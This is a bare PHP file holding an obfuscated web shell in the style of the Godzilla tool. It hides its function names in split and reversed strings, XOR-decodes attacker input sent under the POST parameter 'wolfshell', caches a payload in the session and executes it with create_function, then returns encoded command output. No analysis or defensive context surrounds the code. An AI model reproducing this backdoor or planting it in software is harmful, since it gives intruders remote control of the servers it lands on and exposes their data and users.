<?php
$f_8f1a = 'se'.'ss'.'ion'.'_s'.'tar'.'t';
@$f_8f1a();
$f_9g2b = 's'.'et'.'_t'.'ime'.'_l'.'imi'.'t';
@$f_9g2b(0);
$f_ah3c = 'er'.'ror'.'_re'.'por'.'tin'.'g';
@$f_ah3c(0);
function xor_op_a1($d_in_b2, $k_in_c3){
    $s_len_d4 = call_user_func('st'.'rle'.'n', $d_in_b2);
    for($i=0;$i<$s_len_d4;$i++) {
        $c = $k_in_c3[$i+1&15];
        $d_in_b2[$i] = $d_in_b2[$i]^$c;
    }
    return $d_in_b2;
}
$p_val_e5 = hex2bin('776f6c667368656c6c');
$pl_name_f6 = hex2bin('7061796c6f6164');
$k_val_g7 = '3c6e0b8a9c15224a';
$g_h8 = '_'.strtoupper('post');
if (isset($GLOBALS[$g_h8][$p_val_e5])){
    $b64d_i9 = strrev('edoced_46esab');
    $d_raw_j0 = xor_op_a1($b64d_i9($GLOBALS[$g_h8][$p_val_e5]),$k_val_g7);
    $s_k1 = '_'.strtoupper('session');
    if (isset($GLOBALS[$s_k1][$pl_name_f6])){
        $pl_enc_l2=xor_op_a1($GLOBALS[$s_k1][$pl_name_f6],$k_val_g7);
        $strpos_m3 = 's'.'tr'.'po'.'s';
        if ($strpos_m3($pl_enc_l2,substr('XgetBasicsInfo',1))===false){
            $pl_enc_l2=xor_op_a1($pl_enc_l2,$k_val_g7);
        }
        $exec_n4 = create_function('', $pl_enc_l2);
		$exec_n4();
        $md5_o5 = 'm'.'d'.'5';
        $sub_p6 = 's'.'ubs'.'tr';
        echo $sub_p6($md5_o5($p_val_e5.$k_val_g7),0,16);
        $b64e_q7 = strrev('edocne_46esab');
        echo $b64e_q7(xor_op_a1(@run($d_raw_j0),$k_val_g7));
        echo $sub_p6($md5_o5($p_val_e5.$k_val_g7),16);
    }else{
        $strpos_m3 = 's'.'tr'.'po'.'s';
        if ($strpos_m3($d_raw_j0,base64_decode('Z2V0QmFzaWNzSW5mbw=='))!==false){
            $GLOBALS[$s_k1][$pl_name_f6]=xor_op_a1($d_raw_j0,$k_val_g7);
        }
    }
}